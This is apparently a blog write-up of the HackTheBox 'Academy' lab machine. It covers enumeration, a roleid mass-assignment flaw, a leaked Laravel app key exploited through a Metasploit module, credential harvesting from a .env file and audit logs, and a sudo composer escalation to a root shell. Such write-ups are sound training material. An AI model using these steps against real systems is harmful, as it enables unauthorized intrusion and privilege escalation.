---
title: "HackTheBox - Academy"
author: Nasrallah
description: ""
date: 2023-02-19 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, sudo, logs, adm, metasploit, rce]
img_path: /assets/img/hackthebox/machines/academy
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Academy](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.


```terminal
Nmap scan report for 10.10.10.215
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c090a3d835256ffa3306cf8013a0a553 (RSA)
|   256 2ad54bd046f0edc93c8df65dabae7796 (ECDSA)
|_  256 e16414c3cc51b23ba628a7b1ae5f4535 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found two open ports, port 22 running OpenSSH and port 80 is Apache http web server.

### Web

We saw from the nmap scan that the web server redirects to the hostname academy.htb, let's add it to /etc/hosts and navigate to it.

![](1.png)

It's the welcome page for academy with two links, one for login and the other for register.

I went to the login page and tried some default credentials and sqli but no luck with that.

Let's register a user.

![](2.png)

Now let's login.

![](3.png)

This is the dashboard of the actual HTB academy, but none of the links work.

### gobuster

Let's run a directory/file scan.

```terminal
===============================================================
[+] Url:                     http://academy.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/02/11 11:01:52 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/admin.php            (Status: 200) [Size: 2633]
/admin.php            (Status: 200) [Size: 2633]
/config.php           (Status: 200) [Size: 0]   
/home.php             (Status: 302) [Size: 55034] [--> login.php]
/images               (Status: 301) [Size: 311] [--> http://academy.htb/images/]
/index.php            (Status: 200) [Size: 2117]                                
/index.php            (Status: 200) [Size: 2117]                                
/login.php            (Status: 200) [Size: 2627]                                
/register.php         (Status: 200) [Size: 3003]                                
/server-status        (Status: 403) [Size: 276]                                 
                                                                                
===============================================================

```

We found admin.php which is another login page, we have no credentials for it.

Returning to the register page, i used burp to intercept the register request and found the following.

![](4.png)

The parameter `roleid` with value 0 gets sent with the register request, I used repeater to send another register request but changed to `roleid` value to 1.

With that i managed to login in the admin.php page.

![](5.png)

We see a table that reveals a subdomain, let's add it to /etc/hosts and check it out.

![](6.png)

This looks like a page used by developers to check source code.

![](7.png)

Scrolling down we find that the website uses laravel and we can see the app key.

Let's see if there are any exploit for `laravel`

![](8.png)


## **Foothold**

Let's start msfconsole and use `exploit/unix/http/laravel_token_unserialize_exec`.

We need set the following options

```bash
[msf](Jobs:0 Agents:0) exploit(unix/http/laravel_token_unserialize_exec) >> set app_key dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
app_key => dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
[msf](Jobs:0 Agents:0) exploit(unix/http/laravel_token_unserialize_exec) >> set rhosts 10.10.10.215
rhosts => 10.10.10.215
[msf](Jobs:0 Agents:0) exploit(unix/http/laravel_token_unserialize_exec) >> set vhost dev-staging-01.academy.htb
vhost => dev-staging-01.academy.htb
[msf](Jobs:0 Agents:0) exploit(unix/http/laravel_token_unserialize_exec) >> set lhost tun0
lhost => 10.10.17.90
```

Now let's run the exploit.

![](9.png)

## **Privilege Escalation**

Checking the website files, we find a `.env` file with some credentials.

![](10.png)

Looking for a user to twitch to using the password i found 6 users in /home, so i run `locate user.txt` to locate the user flag and found the user to switch to.

![](11.png)

By running the command id, we see that the user is part of `adm` group, which is a group that can read log files in `/var/log`.

Checking multiple log files, we go to `/var/log/audit` where we use `aureport` to get a summary report from all files in /var/log/audit.

![](12.png)

Now let's run `aureport --tty` to get a report about tty keystrokes

![](13.png)

We can see someone tried to switch to mrb3n and pasted a password.

Let's use that to ssh as `mrb3n`.

Now let's check out current privileges.

```terminal
mrb3n@academy:~$ sudo -l
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer

```

We can run composer as root.

A quick search on GTFOBins, we find the commands we need to run to get a root shell.

```bash
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```

![](20.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
